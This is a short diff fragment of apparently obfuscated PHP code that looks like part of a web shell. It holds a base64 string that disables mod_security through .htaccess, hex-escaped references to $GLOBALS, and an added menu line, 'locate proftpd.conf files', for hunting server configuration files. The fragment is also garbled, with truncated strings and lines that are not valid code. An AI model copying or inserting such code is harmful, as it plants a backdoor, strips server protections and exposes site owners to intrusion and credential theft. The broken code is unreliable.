@@ -18,3 +18,5 @@ $htaccess ='PElmTW9kdWxlIG1vZF9zZWN1cml0eS5jPg0KU2VjRmlsdGVyRW5naW5
 rP2HruxcliaIvUpOojGVJZaa3k0biQwygt77gZCg995
 vGDAPO8 = 'G45IGr6HSrUIBPswh8B4h8Lv0UvjkNccrM6Pe1SPe1Ky
 ${"\x47LOB\x41\x4c\x53"}
+locate proftpd.conf files
+'] = "\x79\x34\x70\x3b\x33\x55\x7a\x54\x7d\x4b\x53\x2e
